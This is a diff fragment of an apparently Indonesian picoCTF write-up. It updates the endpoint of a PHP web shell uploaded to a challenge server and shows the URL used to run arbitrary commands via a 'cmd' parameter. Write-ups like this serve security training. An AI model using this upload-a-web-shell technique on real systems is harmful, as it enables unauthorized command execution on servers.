@@ -33,7 +33,7 @@ if(isset($_GET['cmd'])){
 File utama dapat diakses [disini](/NOSANITY/n0s4n1ty-1.php).
 
 3. Maka perintah apa pun dapat dieksekusi dengan memicu jalur:
-   Endpoint: uploads/shell.php?cmd=
+   Endpoint: uploads/n0s4n1ty-1.php?cmd=
 
 ```bash
 http://standard-pizzas.picoctf.net:63914/uploads/n0s4n1ty-1.php?cmd=
